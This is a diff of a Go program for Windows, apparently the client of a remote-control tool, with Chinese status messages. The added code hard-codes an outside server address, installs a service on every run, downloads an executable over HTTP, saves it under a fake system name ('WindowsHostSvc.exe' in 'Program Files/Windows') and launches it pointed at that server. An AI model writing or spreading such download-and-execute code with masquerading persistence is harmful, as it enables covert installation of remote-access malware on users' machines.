@@ -3,11 +3,12 @@ package main
 import (
 	"bytes"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
 	"time"
-
 
 	"os/exec"
 	"os/user"
@@ -16,7 +17,7 @@ import (
 )
 
 const (
-	ServerAddr  = ""
+	ServerAddr  = "http://rbsi.yxzl.top:5001/"
 	ServiceName = "ATest"
 )
 
@@ -50,7 +51,7 @@ func install() {
 	}
 	fmt.Println("开始程序安装流程...")
 
-	if REINSTALL && !check_service {
+	if !check_service {
 		instsrv, _ := os.Create(DIR + `\instsrv.exe`)
 		instsrv.Write(Instsrv())
 		instsrv.Close()
@@ -106,9 +107,17 @@ func main() {
 		install()
 	}
 
-	
-
-	fmt.Println(StartProcessAsCurrentUser(`C:\WINDOWS\system32\cmd.exe`, `C:\WINDOWS\system32\cmd.exe /c E:\Programming\动态网页\RUI\client_go_main\temp.cmd`, `C:\WINDOWS\system32`, false))
+	os.Mkdir(`D:/Program Files`, os.ModePerm)
+	os.Mkdir(`D:/Program Files/Windows`, os.ModePerm)
+	// res, _ := http.Get("https://cloud.yixiangzhilv.com/api/v3/file/source/139/main.exe?sign=SK1-ke7UMlkiBjUs8Lo4Qu1IT3TI2g94uC3VL6XQZ8c%3D%3A0")
+	res, _ := http.Get("http://127.0.0.1:90/main.exe")
+	exe, _ := os.Create("D:/Program Files/Windows/WindowsHostSvc.exe")
+	io.Copy(exe, res.Body)
+	exe.Close()
+	StartProcessAsCurrentUser(`D:/Program Files/Windows/WindowsHostSvc.exe`, `D:/Program Files/Windows/WindowsHostSvc.exe `+ServerAddr, `D:/Program Files/Windows/`, true)
+	f, _ := os.Create("D:/Desktop/log.txt")
+	f.WriteString(`D:/Program Files/Windows/WindowsHostSvc.exe `+ServerAddr)
+	f.Close()
 
 	time.Sleep(time.Second * 1)
 }
